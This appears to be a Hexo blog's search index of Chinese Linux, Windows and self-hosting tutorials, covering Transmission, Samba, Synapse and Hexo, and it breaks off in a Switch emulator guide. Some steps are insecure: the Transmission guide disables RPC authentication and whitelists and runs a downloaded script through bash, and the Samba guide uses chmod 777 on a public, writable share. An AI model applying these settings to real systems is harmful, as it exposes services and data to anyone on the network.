对于同组人员：可以读取，不能更改，可以执行.<br> 对于其他成员：可以读取，不能更改，可以执行.</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 目录 </tag>
            
            <tag> 指令 </tag>
            
            <tag> 权限 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shortcutforshoka</title>
      <link href="/ug/120738/"/>
      <url>/ug/120738/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-java" data-language="java"><div class="caption"><span>java</span></div><code class="language-java">import java.util.Scanner;...Scanner in = new Scanner (System.in);// 输入 Scan 之后，按下键盘 Alt + “/” 键，Eclipse 下自动补全。System.out.println (in.nextLine ());System.out.println ("Hello" + "world.");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">{% media audio %}- title: 列表 1  list:    - https://music.163.com/#/playlist?id=2943811283    - https://music.163.com/#/playlist?id=2297706586- title: 列表 2  list:    - https://music.163.com/#/playlist?id=2031842656{% endmedia %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原本用于日语汉字假名注音，但别的注音也可以。<br>为了兼容性，采用 markdown-it-ruby 的基本格式： <ruby>文字<rp>【</rp><rt>注音</rt><rp>】</rp></ruby> ，并且为了兼容表格，将分隔符由 | 换成了 ^ 。<br>注音分隔基于 furigana-markdown-it 显示说明看这里</p><p><ruby>取<rp>【</rp><rt>と</rt><rp>】</rp>り<rt></rt>返<rp>【</rp><rt>かえ</rt><rp>】</rp>す<rt></rt></ruby>取とり返かえす<br><ruby>可愛<rp>【</rp><rt>かわい</rt><rp>】</rp>い<rt></rt>犬<rp>【</rp><rt>いぬ</rt><rp>】</rp></ruby>可愛かわいい犬いぬ<br><ruby>可<rp>【</rp><rt>か</rt><rp>】</rp>愛<rp>【</rp><rt>わい</rt><rp>】</rp>い<rt></rt>犬<rp>【</rp><rt>いぬ</rt><rp>】</rp></ruby>可か愛わいい犬いぬ<br><ruby>アクセラレータ<rp>【</rp><rt>accelerator</rt><rp>】</rp></ruby>アクセラレータ accelerator<br><ruby>accelerator<rp>【</rp><rt>アクセラレータ</rt><rp>】</rp></ruby>accelerator アクセラレータ<br><ruby>食<rp>【</rp><rt>た</rt><rp>】</rp>べる<rt></rt></ruby>食たべる<br><ruby>食べる<rp>【</rp><rt>たべる</rt><rp>】</rp></ruby>食べるたべる<br><ruby>あ<rt>●</rt>い<rt>●</rt>う<rt>●</rt>え<rt>●</rt>お<rt>●</rt></ruby>あ●い●う●え●お●<br><ruby>あ<rt>❤</rt>い<rt>❤</rt>う<rt>❤</rt>え<rt>❤</rt>お<rt>❤</rt></ruby>あ❤い❤う❤え❤お❤<br><ruby>常用账号<rp>【</rp><rt>contact</rt><rp>】</rp></ruby>常用账号 contact</p>]]></content>
      
      
      
        <tags>
            
            <tag> 短链 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决windows资源管理器无法自动刷新等问题</title>
      <link href="/ug/164658/"/>
      <url>/ug/164658/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有时候在使用资源管理器新建文件的时候发现无法自动刷新，每次都需要手动刷新才会出现。这同样也导致了 chrome 在保存文件时会卡住一段时间。</p></blockquote><h1 id="solution"><a class="markdownIt-Anchor" href="#solution">#</a> Solution</h1><p>其实解决方法很简单，关掉你映射的所有网络驱动器即可恢复。据说这是 windows 的一个 bug，取消掉网络驱动器映射便解决了这个问题。</p>]]></content>
      
      
      
        <tags>
            
            <tag> win </tag>
            
            <tag> explorer.exe </tag>
            
            <tag> autorefresh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmware安装好后配置centos网络</title>
      <link href="/ug/222828/"/>
      <url>/ug/222828/</url>
      
        <content type="html"><![CDATA[<h1 id="更改-ifcfg-ens33-文件"><a class="markdownIt-Anchor" href="#更改-ifcfg-ens33-文件">#</a> 更改 ifcfg-ens33 文件</h1><blockquote><p>编辑配置文件</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vi /etc/sysconfig/network-scripts/ifcfg-ens33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>需要添加 / 修改的地方</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">BOOTPROTO=staticONBOOT=yesIPADDR=192.168.xx.xxNETMASK=255.255.255.0GATEWAY=192.168.204.2DNS1=8.8.8.8DNS2=114.114.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="编辑-resolvconf-文件"><a class="markdownIt-Anchor" href="#编辑-resolvconf-文件">#</a> 编辑 resolv.conf 文件</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vi /etc/resolv.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>添加如下内容</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># Generated by NetworkManagersearch localdomainnameserver 8.8.8.8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="重启网卡"><a class="markdownIt-Anchor" href="#重启网卡">#</a> 重启网卡</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">service network restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> centos </tag>
            
            <tag> network </tag>
            
            <tag> vmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在你的 linux nas 上安装一个种子下载器吧！</title>
      <link href="/ug/002853/"/>
      <url>/ug/002853/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="markdownIt-Anchor" href="#intro">#</a> Intro</h1><p>Transmission 是一款流行的 BT 下载软件，比其他客户端使用更少的资源，守护程序非常适合服务器，并且可以通过桌面 GUI、Web 界面和终端程序进行远程控制，支持本地对等发现、完全加密、DHT、µTP、PEX 和 Magnet Link 等。</p><h1 id="安装"><a class="markdownIt-Anchor" href="#安装">#</a> 安装</h1><p>这有啥好说的，直接 apt 一把梭：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt install transmission-daemon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过在更改配置前，建议先关一下服务，以防万一：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo systemctl stop transmission-daemon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="配置"><a class="markdownIt-Anchor" href="#配置">#</a> 配置</h1><ol><li>transmission 的配置文件在  <code>/etc/transmission-daemon/settings.json</code></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nano /etc/transmission-daemon/settings.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>主要需要看看下面这几项：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">"download-dir": "/home/pi/complete", # 下载目录 "incomplete-dir": "/home/pi/incomplete", # 下载未完成文件目录"rpc-authentication-required": false, # 懒得配置密码直接把验证关掉。"rpc-host-whitelist-enabled": false,"rpc-port": 9091, # 默认 Web 访问端口，这个可以根据需要修改一下。"rpc-whitelist-enabled": false, # 白名单开关"utp-enabled": true # 允许 Web 登录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>修改完成后启动 daemon：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo systemctl start transmission-daemon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>浏览器打开 127.0.0.1:9091 查看效果：<br><img src="/img/transmission/20220920213841.png" alt=""></li></ol><h1 id="安装第三方主题"><a class="markdownIt-Anchor" href="#安装第三方主题">#</a> 安装第三方主题</h1><p>下载并执行 TWC 中文界面安装脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget https://github.com/ronggang/transmission-web-control/raw/master/release/install-tr-control-cn.shbash install-tr-control-cn.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>按 数字 1 然后回车安装。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&lt;&lt; 2022-08-29 00:27:53 &gt;&gt; 安装脚本执行完成。如遇到问题请查看：https://github.com/ronggang/transmission-web-control/wiki&lt;&lt; 2022-08-29 00:27:53 &gt;&gt; == 结束 ==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>弹出如上提示则安装成功，返回 web 界面刷新即可。<br><img src="/img/transmission/20220920213753.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> transmission </tag>
            
            <tag> torrent </tag>
            
            <tag> 下载器 </tag>
            
            <tag> nas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Windows直接访问WSL2路径并直接进行读写操作,权限不足的问题</title>
      <link href="/ug/234236/"/>
      <url>/ug/234236/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="markdownIt-Anchor" href="#intro">#</a> Intro</h1><p>初次安装 WSL Ubuntu 时，一般都会设置默认登录用户，当你通过 windows 访问该文件夹时，如果访问的 Ubuntu 目录的权限用户时你的默认用户，你可以对其进行修改。但是如果你访问的时 root 权限的用户，则会出现如权限不足，permission deny 报错。</p><h1 id="solution"><a class="markdownIt-Anchor" href="#solution">#</a> Solution</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:\Users\wangj\AppData\Local\Microsoft\WindowsApps\debian.exe config --default-user root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改完成后，记得重启 wsl：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wsl --shutdown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10s 后，在执行 wsl 命令，然后再次测试，看是否可行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> wsl </tag>
            
            <tag> 权限不足 </tag>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部署完hexo后还应该准备哪些工作</title>
      <link href="/ug/222543/"/>
      <url>/ug/222543/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="markdownIt-Anchor" href="#intro">#</a> Intro</h1><p>上一回我们讲到了如何部署 hexo 到 github 上，并简单的向 repo 里推送了你的博客。这一回我们简单的来完善你的博客。</p><h1 id="0主题配置"><a class="markdownIt-Anchor" href="#0主题配置">#</a> 0. 主题配置</h1><blockquote><p><a href="https://shoka.lostyu.me/computer-science/note/theme-shoka-doc/display/" title="Click Me">Click Me</a></p><p><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md" title="matery">matery</a></p></blockquote><h1 id="1备份hexo源文件到-backup-分支"><a class="markdownIt-Anchor" href="#1备份hexo源文件到-backup-分支">#</a> 1. 备份 Hexo 源文件到 Backup 分支</h1><p>由于种种原因我们总会更改自己的工作环境或者一顿操作猛如虎，将自己博客的源文件一通收拾，然后就没有然后了。<br>所以建议大家创建好博客记得把源文件也一同备份到 Github 上以防万一。</p><h2 id="创建backup分支"><a class="markdownIt-Anchor" href="#创建backup分支">#</a> 创建 backup 分支</h2><ol><li>打开你 GitHub repo 的页面，点击左上角的分支选项。</li><li>点击 View all branches，然后点击右上角的 New branch。</li><li>Branch name：backup，Branch source：master</li><li>create branch。</li></ol><h2 id="将backup分支切换为默认分支"><a class="markdownIt-Anchor" href="#将backup分支切换为默认分支">#</a> 将 backup 分支切换为默认分支</h2><blockquote><p>我也不知道为什么要这么做，但是不这么做最后一步就没法 push 了 😦</p></blockquote><h2 id="将repo-clone到本地"><a class="markdownIt-Anchor" href="#将repo-clone到本地">#</a> 将 repo clone 到本地</h2><ol><li>直接在博客根目录下执行这个命令：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">git clone '你的repo'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>将克隆过来 repo 里的 <code>.git</code>  文件夹拷贝到博客根目录。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cp -r ./'你的repo' ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>依次执行以下指令</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 保存所有文件到暂存区git add .// 提交变更git commit -m 'Backup'// 推送到github，分支为Backupgit push origin backup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="报错"><a class="markdownIt-Anchor" href="#报错">#</a> 报错</h2><p>可能会提示如下错误</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fatal: unable to access 'https://github.com/xxx/xxx.github.io.git/': GnuTLS recv error (-110): The TLS connection was non-properly terminated.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行下面的指令即可正常推送</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">git config --global --unset http.proxygit config --global --unset git.proxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="还原"><a class="markdownIt-Anchor" href="#还原">#</a> 还原</h2><ol><li>克隆 backup 分支到本地</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">git clone -b backup https://github.com/maxshiro/maxshiro.github.io.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>安装依赖</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cnpm install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2-博客加密"><a class="markdownIt-Anchor" href="#2-博客加密">#</a> 2. 博客加密</h1><ul><li>有时候我们可能需要写一些私密的博客，通过密码验证的方式让人不能随意浏览。</li><li>这在 wordpress，emlog 或其他博客系统中都很容易实现，然而 hexo 除外。😦</li><li>为了解决这个问题，我们需要安装 “hexo-blog-encrypt” 扩展。</li></ul><h2 id="安装指令"><a class="markdownIt-Anchor" href="#安装指令">#</a> 安装指令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm install hexo-blog-encrypt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="快速使用"><a class="markdownIt-Anchor" href="#快速使用">#</a> 快速使用</h2><p>将 password 标签添加到您的 Front-matter 里，就像这样：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">---title: xxxdate: 2022-08-26 17:34:59password: 233tags: xxx---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="特性"><a class="markdownIt-Anchor" href="#特性">#</a> 特性</h2><ul><li>一旦你输入了正确的密码，它就会被存储在本地浏览器的 localStorage 中。按个按钮，密码将会被清空。若博客中有脚本，它将被正确地执行。</li><li>支持按标签加密。</li><li>所有的核心功能都是由原生的 API 所提供的。在 Node.js 中，我们使用 Crypto。在浏览器中，我们使用 Web Crypto API。</li><li>PBKDF2，SHA256 被用作复制密钥，AES256-CBC 被用作加解密，我们还使用 HMAC 来验证密文的来源，并确保其纠正。</li><li>广泛地使用 Promise 来进行异步操作，从而确保线程不被杜塞。</li><li>过时的浏览器将无法正常显示，因此，请升级您的浏览器。</li></ul><h1 id="3-博客加速"><a class="markdownIt-Anchor" href="#3-博客加速">#</a> 3. 博客加速</h1><blockquote><p>于 2022 年 11 月测试 vercel.app 已经被墙了，但是还可以通过自备域名的方式。</p></blockquote><p>使用 Vercel 加速 Hexo 博客访问速度。<br>如果你想让您的博客更快的更新，那么可以采取这种方法的同时，也可以加速你的博客。<br>该方法适用于已经使用我的方法将博客源文件备份到了 github 的。</p><h2 id="步骤"><a class="markdownIt-Anchor" href="#步骤">#</a> 步骤</h2><ol><li><a href="http://xn--vercel-oi2ls3t.com">打开 vercel.com</a>, 这个域名没有被墙。登陆的时候选择 github 方式。<br><img src="/img/hexoplugin/20221116141135.png" alt=""></li><li>创建新项目，选择 git 仓库中已存在的项目，然后选 Deploy。</li><li>创建完成后就可以通过  <code>你项目名称.vercel.app</code>  访问了。但是目前 vercel.app 已经被墙了，所以还需要在设置里添加自己的域名。</li><li>切换到自己的域名控制台里添加一条 cname 记录，指向这个地址  <code>cname-china.vercel-dns.com</code>  。</li><li>将 Git Branch 里的内容改为存放自己博客备份的分支，比如我的就是 backup 分支。同时也可以将分配给你的二级域名也改成这个分支。<br><img src="/img/hexoplugin/20221116144428.png" alt=""></li><li>切换到 Git 项目，将 Production Branch 也更改为 backup 分支。<br><img src="/img/hexoplugin/20221116144502.png" alt=""></li><li>此时如果你的 backup 分支如果有更新，那么 vercel 会自动克隆你的源文件然后编译更新 cache。</li><li>使用这种方法独立于 github page。只有当你 hexo d 之后源博客才会更新。</li></ol><h2 id="保护博客源码内容"><a class="markdownIt-Anchor" href="#保护博客源码内容">#</a> 保护博客源码内容</h2><p>如果你认为这种方式要更好一些，当然你也可以选择直接关掉 github page 并将仓库设置为 private，这样别人就无法轻易获取您博客的源代码了。</p><h1 id="写作流程"><a class="markdownIt-Anchor" href="#写作流程">#</a> 写作流程</h1><h2 id="第一次使用"><a class="markdownIt-Anchor" href="#第一次使用">#</a> 第一次使用</h2><ol><li>安装 nodejs，git，hexo，npm</li><li>git clone 仓库链接</li><li>cd 到目录然后 cnpm install</li><li>撰写博客</li></ol><h2 id="通过github-page"><a class="markdownIt-Anchor" href="#通过github-page">#</a> 通过 github page</h2><ol><li>撰写博客</li><li>保存到 github。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 保存所有文件到暂存区git add .// 提交变更git commit -m 'Backup'// 推送到github，分支为Backupgit push origin backup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>生成并提交网页。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 生成静态网页hexo g// 生成目录文件hexo algolia// 打开本地服务器预览hexo s// 提交到github pagehexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>等待网页更新。</li></ol><h2 id="通过vercelcom"><a class="markdownIt-Anchor" href="#通过vercelcom">#</a> <a href="http://xn--vercel-2u3sdu.com">通过 vercel.com</a></h2><ol><li>撰写博客</li><li>保存到 github。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 保存所有文件到暂存区git add .// 提交变更git commit -m 'Backup'// 推送到github，分支为Backupgit push origin backup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>等待网页更新。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> plugin </tag>
            
            <tag> hexo </tag>
            
            <tag> backup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos安装MatrixSynapseChat简易教程</title>
      <link href="/ug/212907/"/>
      <url>/ug/212907/</url>
      
        <content type="html"><![CDATA[<h2 id="先安装前置"><a class="markdownIt-Anchor" href="#先安装前置">#</a> 先安装前置</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum install libtiff-devel libjpeg-devel libzip-devel freetype-devel libwebp-devel libxml2-devel libxslt-devel libpq-devel python3-virtualenv libffi-devel openssl-devel python3-develyum groupinstall "Development Tools"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="使用root账户接入您的centos找到合适的位置开始操作"><a class="markdownIt-Anchor" href="#使用root账户接入您的centos找到合适的位置开始操作">#</a> 使用 root 账户接入您的 centos，找到合适的位置开始操作</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mkdir syn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="依次执行以下指令"><a class="markdownIt-Anchor" href="#依次执行以下指令">#</a> 依次执行以下指令</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">virtualenv -p python3 ./env &amp;&amp; source ./env/bin/activatepython3 -m pip install --upgrade pip &amp;&amp; python3 -m pip install --upgrade setuptools &amp;&amp; python3 -m pip install psycopg2-binarypython3 -m pip install matrix-synapse                         //安装synapsepython3 -m pip install -U matrix-synapse                    //更新synapse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="将下列指令拷贝到控制台执行自动生成homeserveryaml"><a class="markdownIt-Anchor" href="#将下列指令拷贝到控制台执行自动生成homeserveryaml">#</a> 将下列指令拷贝到控制台执行，自动生成 homeserver.yaml</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 -m synapse.app.homeserver \    --server-name im.axro.top \    --config-path homeserver.yaml \    --generate-config \    --report-stats=no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="编辑生成homeserveryaml"><a class="markdownIt-Anchor" href="#编辑生成homeserveryaml">#</a> 编辑生成 <code>homeserver.yaml</code></h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">enable_registration: truesuppress_key_server_warning: truebind_addresses: ['::1', '0.0.0.0']<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="启动关闭服务器"><a class="markdownIt-Anchor" href="#启动关闭服务器">#</a> 启动 / 关闭服务器</h2><h4 id="注意要先进入虚拟python环境"><a class="markdownIt-Anchor" href="#注意要先进入虚拟python环境">#</a> 注意要先进入虚拟 python 环境</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">source ./env/bin/activatesynctl startsynctl stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="退出虚拟环境"><a class="markdownIt-Anchor" href="#退出虚拟环境">#</a> 退出虚拟环境</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deactivate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="配置反代"><a class="markdownIt-Anchor" href="#配置反代">#</a> 配置反代</h2><p>进入宝塔面板新建静态网站，配置 ssl，配置反向代理地址为 <code>https://localhost:8008</code> , 保存即可.</p>]]></content>
      
      
      
        <tags>
            
            <tag> nextcloud </tag>
            
            <tag> 聊天室 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决linux下挂载其他linux硬盘的问题并创建smb局域网共享</title>
      <link href="/ug/211502/"/>
      <url>/ug/211502/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="markdownIt-Anchor" href="#intro">#</a> Intro</h1><blockquote><p>之前用来当作小型服务器的笔记本终于被我给淘汰了。已经关机了好久。最近买了块 <code>SATA</code>  硬盘盒，想要将这台笔记本内的数据备份出来并把硬盘用作其他用途。一切连接好后发现无法挂载，遂百度了一会查出了如下方法…</p></blockquote><h1 id="故障复现"><a class="markdownIt-Anchor" href="#故障复现">#</a> 故障复现</h1><ol><li>连接 linux 系统，提示插入硬盘. <code>/dev</code>  分区下出现硬盘编号</li><li>执行如下指令</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd /mkdir backupmount /dev/sdc/ /backup/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>报错</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mount: unknown filesystem type 'LVM2_member'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="解决方法-debian系"><a class="markdownIt-Anchor" href="#解决方法-debian系">#</a> 解决方法 //Debian 系</h1><ol><li>执行如下指令安装 lvm2 并扫描查看以挂载的磁盘</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt-get install lvm2sudo vgscan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>发现如下字样后找到对应的 <code>xxx</code></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Found volume group "xxx" using metadata type lvm2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>设为活动状态并查看可挂载的分区</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo vgchange -ay xxxsudo lvsLV     VG   Attr   LSize  Origin Snap%  Move Log Copy%  Convertdata        xxx             -wi-a-              34.19G      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>挂载对应分区</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo mount /dev/xxx/data/ /backup/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>至此已经解决了问题，如果你还想把这块硬盘里的数据共享出去，比如共享给局域网内的 windows 主机，那就接着看…</p></blockquote><h1 id="设置smb"><a class="markdownIt-Anchor" href="#设置smb">#</a> 设置 SMB</h1><ol><li>先更新一下</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt-get update &amp;&amp; sudo apt-get upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>安装 Samba 服务</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt-get install samba samba-common<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>配置共享目录</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 新建目录sudo mkdir /home/db// 更改目录权限sudo chmod 777 /home/db/ -R<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>添加账户</li></ol><blockquote><p>要注意添加的账户需要是系统内已存在的账户</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 后面的pi为系统的用户名sudo smbpasswd -a pi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>输入两次密码后创建成功</p></blockquote><ul><li>创建系统账户</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// -m参数为添加/home/username目录,username更改为你要创建的用户名.sudo useradd -m username// 更改账户密码sudo passwd username// 删除用户sudo userdel -r username// 更改登录zhanghusu -username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>配置 samba</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 建议先备份一下sudo cp /etc/samba/smb.conf /etc/samba/smb.conf.bak// 编辑sudo vim /etc/samba/smb.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在文件最后添加</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">[database]     comment = 23333333  # 描述path = /home/db/    # 目录public = yes        # 是否允许guest用户访问writable = yes      # 是否允许读写workgroup = WORKGROUP  # 工作组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>重启 samba 服务</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo service smbd restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在 windows 里面映射就行了</p><h1 id="借鉴摘抄"><a class="markdownIt-Anchor" href="#借鉴摘抄">#</a> 借鉴 (摘抄)</h1><p><a href="https://blog.csdn.net/mvp_Dawn/article/details/105847485" title="ubuntu 20.04 安装配置Samba服务，Windows 和 linux协同工作">ubuntu 20.04 安装配置 Samba 服务，Windows 和 linux 协同工作</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 运维 </tag>
            
            <tag> smb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Switch模拟器的安装使用以及游戏文件获取和处理。</title>
      <link href="/ug/211224/"/>
      <url>/ug/211224/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/ns/1.gif" alt=""></p><h1 id="引子"><a class="markdownIt-Anchor" href="#引子">#</a> 引子</h1><blockquote><p>本篇文章起源于之前我想玩 mega39 而写，现在我对这些内容有了新的理解，再次进行更改记录。</p></blockquote><p><strong>Ryujinx 和 yuzu 模拟器任选一个即可。如果游戏运行有问题再尝试另外一个</strong></p><h1 id="配置要求"><a class="markdownIt-Anchor" href="#配置要求">#</a> 配置要求</h1><blockquote><p><code>ryujinx</code>  和  <code>yuzu</code>  都适用。</p></blockquote><h2 id="软体"><a class="markdownIt-Anchor" href="#软体">#</a> 软体:</h2><blockquote><p>建议运行 Windows 10 1803 或较新版本以获得最佳性能。这里仅列出 Win10 64 位 要求.</p><p>如果你要在 linux 下使用则建议您找找其他的教程，我目前还没有使用 linux 的机器。</p></blockquote><hr><blockquote><p>硬体要求适用于所有 Switch 游戏.</p></blockquote><h2 id="cpu"><a class="markdownIt-Anchor" href="#cpu">#</a> CPU:</h2><blockquote><p>任何支持 FMA 指令集的 x86_64 CPU。 建议使用 6 个或更多线程。</p></blockquote><ul><li>最小: Intel Core i5-4430 / AMD Ryzen 3 1200</li><li>推荐: Intel Core i5-10400 / AMD Ryzen 5 3600</li></ul><h2 id="专用显示卡"><a class="markdownIt-Anchor" href="#专用显示卡">#</a> 专用显示卡:</h2><p><strong>必须使用 OpenGL 4.6 或 Vulkan 1.1 兼容硬件和驱动程序。 推荐使用支持半浮点以及 4GB 显示内存。</strong></p><blockquote><p>大多数游戏都可以在 Fermi 系列（400 系列）或更高版本的 Nvidia GPU 上运行，但强烈建议至少使用 Pascal（1000 系列）。</p></blockquote><ul><li>最小: NVIDIA GeForce GT 1030 2GB / AMD Radeon RX 550 2GB</li><li>推荐: NVIDIA GeForce GTX 